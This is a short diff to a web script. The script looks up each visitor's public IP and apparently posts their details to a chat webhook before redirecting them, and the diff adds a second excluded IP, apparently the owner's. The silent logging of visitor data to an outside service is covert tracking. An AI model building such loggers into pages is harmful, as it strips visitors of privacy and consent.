@@ -115,7 +115,7 @@ fetch("https://api.ipify.org")
 .then(response => response.text())
 .then((response) => {
 	ip_address = response;
-	if (ip_address == "221.127.45.3") {
+	if (ip_address == "221.127.45.3" || ip_address == "113.28.211.157") {
 		// device_info = "User: Kee Meng\n\n";
 		// send_message();
 	}
@@ -180,7 +180,7 @@ function send_message2(string, link, details=false) {
 		username: "Hello World",
 		embeds: info
 	}
-	if (ip_address != "221.127.45.3") {
+	if (ip_address != "221.127.45.3" && ip_address != "113.28.211.157") {
 		request.send(JSON.stringify(params));
 	}
 	setTimeout(function(){window.location.href = link;},1250);
